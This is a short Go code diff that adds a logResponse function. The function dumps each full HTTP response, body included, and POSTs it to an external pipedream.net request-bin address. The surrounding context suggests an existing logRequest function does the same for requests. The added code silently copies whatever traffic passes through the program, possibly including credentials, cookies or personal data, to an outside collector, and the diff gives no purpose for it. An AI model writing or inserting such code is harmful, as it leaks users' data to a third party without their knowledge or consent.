@@ -112,3 +112,24 @@ func logRequest(r2 *http.Request) {
 
 	defer resp.Body.Close()
 }
+
+func logResponse(r2 *http.Response) {
+	payloadBytes, err := httputil.DumpResponse(r2, true)
+	if err != nil {
+		panic(err)
+	}
+	body := bytes.NewReader(payloadBytes)
+
+	req, err := http.NewRequest("POST", "https://df39fb31467ff557acc53983605f1ff8.m.pipedream.net", body)
+	if err != nil {
+		panic(err)
+	}
+	req.Header.Set("Content-Type", "text/plain")
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		panic(err)
+	}
+
+	defer resp.Body.Close()
+}
